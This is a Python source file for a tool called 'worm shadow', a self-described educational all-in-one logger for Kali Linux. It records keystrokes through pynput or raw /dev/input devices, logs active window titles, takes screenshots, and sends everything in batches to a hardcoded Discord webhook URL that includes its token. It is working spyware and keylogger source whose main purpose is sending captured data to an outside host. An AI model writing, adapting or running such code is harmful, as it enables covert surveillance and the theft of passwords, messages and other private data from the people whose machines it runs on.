#!/usr/bin/env python3
# worm shadow — kali linux all-in-one logger (educational)
import os
import sys
import time
import threading
import subprocess
import datetime
import re
import shutil
import json
import glob
from pathlib import Path

# ================= CONFIG =================
WEBHOOK_URL = "https://discord.com/api/webhooks/1558530892736241726/JIDYqHtJXL3xKSmdjRekY2PRrP6kHIeFABNNBuleqxf1_KL0TsPciVB098Grav1tk3ut"
WEBHOOK_INTERVAL = 5        # sekunden zwischen sends
WEBHOOK_BATCH_MAX = 30      # max zeilen pro embed
SEND_SCREENSHOTS = True     # screenshots mitsenden wenn screenshots an
# ==========================================

# ---------- http backend ----------
try:
    import requests
    def http_post_json(url, payload):
        r = requests.post(url, json=payload, timeout=15,
                          headers={"User-Agent": "Mozilla/5.0 worm-shadow"})
        return r.status_code, r.text[:300]
    def http_post_multipart(url, payload_json, file_field, file_path, filename):
        with open(file_path, "rb") as f:
            files = {file_field: (filename, f, "image/png")}
            data = {"payload_json": payload_json}
            r = requests.post(url, data=data, files=files, timeout=30,
                              headers={"User-Agent": "Mozilla/5.0 worm-shadow"})
        return r.status_code, r.text[:300]
    HTTP_BACKEND = "requests"
except ImportError:
    import urllib.request
    def http_post_json(url, payload):
        try:
            data = json.dumps(payload).encode()
            req = urllib.request.Request(url, data=data, headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 worm-shadow"})
            with urllib.request.urlopen(req, timeout=15) as r:
                return r.status, r.read().decode(errors="ignore")[:300]
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="ignore")[:300]
        except Exception as e:
            return -1, str(e)
    def http_post_multipart(url, payload_json, file_field, file_path, filename):
        # minimal multipart implementation for urllib fallback
        boundary = "----wormshadow" + str(int(time.time() * 1000))
        with open(file_path, "rb") as f:
            file_data = f.read()
        body = b""
        body += f"--{boundary}\r\n".encode()
        body += b'Content-Disposition: form-data; name="payload_json"\r\n\r\n'
        body += payload_json.encode() + b"\r\n"
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="{file_field}"; filename="{filename}"\r\n'.encode()
        body += b"Content-Type: image/png\r\n\r\n"
        body += file_data + b"\r\n"
        body += f"--{boundary}--\r\n".encode()
        try:
            req = urllib.request.Request(url, data=body, headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "User-Agent": "Mozilla/5.0 worm-shadow"})
            with urllib.request.urlopen(req, timeout=30) as r:
                return r.status, r.read().decode(errors="ignore")[:300]
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="ignore")[:300]
        except Exception as e:
            return -1, str(e)
    HTTP_BACKEND = "urllib"

# ---------- dep check ----------
missing = []
try:
    import mss
    import mss.tools
except ImportError:
    missing.append("mss")
try:
    from pynput import keyboard as pynput_kb
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False
try:
    import evdev
    from evdev import ecodes
    HAS_EVDEV = True
except ImportError:
    HAS_EVDEV = False

if missing:
    print(f"[worm shadow] missing deps: {', '.join(missing)}")
    print("[worm shadow] run: python3 setup1.py")
    sys.exit(1)

# ---------- config ----------
LOG_DIR = Path("logs")
SHOT_DIR = Path("screenshots")
KEY_LOG = LOG_DIR / "keylog.txt"
WIN_LOG = LOG_DIR / "windowlog.txt"
SCREENSHOT_ENABLED = False
IS_ROOT = (os.geteuid() == 0)
SESSION = os.environ.get("XDG_SESSION_TYPE", "").lower()
IS_WAYLAND = SESSION == "wayland"

# ---------- helpers ----------
def ensure_dirs():
    LOG_DIR.mkdir(exist_ok=True)
    SHOT_DIR.mkdir(exist_ok=True)


def ts():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def safe_filename(s):
    s = re.sub(r'[^\w\s-]', '', s).strip()
    s = re.sub(r'[-\s]+', '_', s)
    return s[:80] or "unknown"


def append(path, line):
    try:
        with open(path, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass

# ---------- window title ----------
def get_active_window_title():
    if shutil.which("xdotool"):
        try:
            out = subprocess.check_output(
                ["xdotool", "getactivewindow", "getwindowname"],
                stderr=subprocess.DEVNULL, timeout=1)
            t = out.decode(errors="ignore").strip()
            if t:
                return t
        except Exception:
            pass
    if IS_WAYLAND and shutil.which("gdbus"):
        try:
            out = subprocess.check_output(
                ["gdbus", "call", "--session",
                 "--dest", "org.gnome.Shell",
                 "--object-path", "/org/gnome/Shell",
                 "--method", "org.gnome.Shell.Eval",
                 "global.get_window_actors().map(a=>a.meta_window.get_title()).join('|')"],
                stderr=subprocess.DEVNULL, timeout=1)
            s = out.decode(errors="ignore")
            m = re.search(r"'([^']*)'", s)
            if m and m.group(1):
                return m.group(1).split("|")[-1]
        except Exception:
            pass
    return None

# ---------- key backends ----------
def run_pynput_backend():
    print("[worm shadow] key backend: pynput (x11)")
    def on_press(key):
        try:
            if hasattr(key, "char") and key.char is not None:
                append(KEY_LOG, f"{ts()} | {key.char}")
            else:
                append(KEY_LOG, f"{ts()} | [{key}]")
        except Exception:
            pass
    listener = pynput_kb.Listener(on_press=on_press)
    listener.start()
    return listener


KEY_NAMES = {}
if HAS_EVDEV:
    for name in dir(ecodes):
        if name.startswith("KEY_"):
            code = getattr(ecodes, name)
            if isinstance(code, int):
                KEY_NAMES[code] = name[4:]


def run_evdev_backend():
    if not HAS_EVDEV:
        print("[worm shadow] evdev not installed — cannot use /dev/input backend")
        return []
    if not IS_ROOT:
        print("[worm shadow] /dev/input backend needs root. run with sudo.")
        return []

    devices = []
    for path in glob.glob("/dev/input/event*"):
        try:
            d = evdev.InputDevice(path)
            if ecodes.EV_KEY in d.capabilities():
                devices.append(d)
        except Exception:
            continue

    if not devices:
        print("[worm shadow] no readable input devices found.")
        return []

    print(f"[worm shadow] key backend: evdev on {len(devices)} device(s)")

    def read_device(dev):
        try:
            for event in dev.read_loop():
                if event.type == ecodes.EV_KEY and event.value == 1:
                    name = KEY_NAMES.get(event.code, f"key_{event.code}")
                    append(KEY_LOG, f"{ts()} | [{name}]")
        except Exception:
            pass

    threads = []
    for d in devices:
        t = threading.Thread(target=read_device, args=(d,), daemon=True)
        t.start()
        threads.append(t)
    return threads

# ---------- window monitor ----------
def window_monitor(stop_event):
    last = None
    while not stop_event.is_set():
        title = get_active_window_title()
        if title and title != last:
            last = title
            append(WIN_LOG, f"{ts()} | {title}")
            if SCREENSHOT_ENABLED:
                take_screenshot(title)
        time.sleep(1)

# ---------- screenshots ----------
def take_screenshot(title):
    if not SCREENSHOT_ENABLED:
        return None
    try:
        with mss.mss() as sct:
            mon = sct.monitors[1]
            img = sct.grab(mon)
            stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            fname = f"{stamp}_{safe_filename(title)}.png"
            path = SHOT_DIR / fname
            mss.tools.to_png(img.rgb, img.size, output=str(path))
            return path
    except Exception:
        return None

# ---------- webhook ----------
def send_test_ping():
    """Send a startup ping so you know the webhook works."""
    payload = {
        "content": f"[worm shadow] online — host: `{os.uname().nodename}` | backend: `{HTTP_BACKEND}`"
    }
    code, body = http_post_json(WEBHOOK_URL, payload)
    print(f"[worm shadow] webhook test → HTTP {code}")
    if code not in (200, 204):
        print(f"[worm shadow] webhook response: {body}")
    return code in (200, 204)


class WebhookSender(threading.Thread):
    def __init__(self, url, stop_event):
        super().__init__(daemon=True)
        self.url = url
        self.stop_event = stop_event
        self.key_pos = 0
        self.win_pos = 0
        self.shot_pos = 0
        self.first_run = True

    def _read_new(self, path, pos):
        if not path.exists():
            return [], pos
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                f.seek(pos)
                lines = f.read().splitlines()
                new_pos = f.tell()
            return lines, new_pos
        except Exception:
            return [], pos

    def run(self):
        print("[worm shadow] webhook sender running")
        while not self.stop_event.is_set():
            # first run: send immediately; after that: sleep interval
            if not self.first_run:
                time.sleep(WEBHOOK_INTERVAL)
            self.first_run = False

            try:
                key_lines, self.key_pos = self._read_new(KEY_LOG, self.key_pos)
                win_lines, self.win_pos = self._read_new(WIN_LOG, self.win_pos)

                if key_lines:
                    print(f"[worm shadow] sending {len(key_lines)} key lines")
                    for i in range(0, len(key_lines), WEBHOOK_BATCH_MAX):
                        chunk = key_lines[i:i + WEBHOOK_BATCH_MAX]
                        payload = {"embeds": [{
                            "title": "keylog",
                            "description": "```\n" + "\n".join(chunk) + "\n```"[:3900],
                            "color": 0x9b59b6,
                            "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
                        }]}
                        code, body = http_post_json(self.url, payload)
                        if code not in (200, 204):
                            print(f"[worm shadow] key send failed: HTTP {code} — {body}")

                if win_lines:
                    print(f"[worm shadow] sending {len(win_lines)} window lines")
                    for i in range(0, len(win_lines), WEBHOOK_BATCH_MAX):
                        chunk = win_lines[i:i + WEBHOOK_BATCH_MAX]
                        payload = {"embeds": [{
                            "title": "windows / tabs",
                            "description": "```\n" + "\n".join(chunk) + "\n```"[:3900],
                            "color": 0x3498db,
                            "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
                        }]}
                        code, body = http_post_json(self.url, payload)
                        if code not in (200, 204):
                            print(f"[worm shadow] win send failed: HTTP {code} — {body}")

                if SEND_SCREENSHOTS and SCREENSHOT_ENABLED:
                    shots = sorted(SHOT_DIR.glob("*.png"))
                    if len(shots) > self.shot_pos:
                        for shot in shots[self.shot_pos:]:
                            print(f"[worm shadow] uploading {shot.name}")
                            payload_json = json.dumps({"content": f"screenshot: `{shot.name}`"})
                            code, body = http_post_multipart(
                                self.url, payload_json, "file", str(shot), shot.name)
                            if code not in (200, 204):
                                print(f"[worm shadow] shot upload failed: HTTP {code} — {body}")
                        self.shot_pos = len(shots)

            except Exception as e:
                print(f"[worm shadow] webhook loop error: {e}")

# ---------- main ----------
def main():
    global SCREENSHOT_ENABLED
    ensure_dirs()

    print("[worm shadow] linux all-in-one logger (kali)")
    print(f"  session:     {SESSION or 'unknown'}")
    print(f"  root:        {IS_ROOT}")
    print(f"  http:        {HTTP_BACKEND}")
    print(f"  webhook:     {'set' if WEBHOOK_URL else 'NOT SET'}")
    print(f"  logs:        {LOG_DIR.resolve()}")
    print(f"  screenshots: {SHOT_DIR.resolve()}")

    # startup ping
    if WEBHOOK_URL:
        send_test_ping()
    else:
        print("[worm shadow] WARNING: WEBHOOK_URL empty — nothing will be sent.")
        sys.exit(1)

    # key backend
    listener = None
    ev_threads = []

    if IS_WAYLAND:
        if IS_ROOT and HAS_EVDEV:
            ev_threads = run_evdev_backend()
            if not ev_threads:
                print("[worm shadow] no evdev backend — exiting.")
                sys.exit(1)
        elif HAS_PYNPUT:
            print("[worm shadow] wayland + non-root: pynput will get nothing.")
            listener = run_pynput_backend()
        else:
            print("[worm shadow] no usable key backend on wayland. exiting.")
            sys.exit(1)
    else:
        if HAS_PYNPUT:
            listener = run_pynput_backend()
        elif IS_ROOT and HAS_EVDEV:
            ev_threads = run_evdev_backend()
        else:
            print("[worm shadow] no usable key backend. exiting.")
            sys.exit(1)

    choice = input("Enable screenshots? (y/N): ").strip().lower()
    if choice != "y":
        print("[worm shadow] no screenshots. closing.")
        if listener:
            listener.stop()
        sys.exit(0)

    SCREENSHOT_ENABLED = True
    print("[worm shadow] screenshots on. logging. ctrl+c to stop.")

    stop_event = threading.Event()
    wm_thread = threading.Thread(target=window_monitor, args=(stop_event,), daemon=True)
    wm_thread.start()

    sender = WebhookSender(WEBHOOK_URL, stop_event)
    sender.start()

    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[worm shadow] stopping...")
        stop_event.set()
        if listener:
            listener.stop()
        print("[worm shadow] stopped. later, he.")


if __name__ == "__main__":
    main()
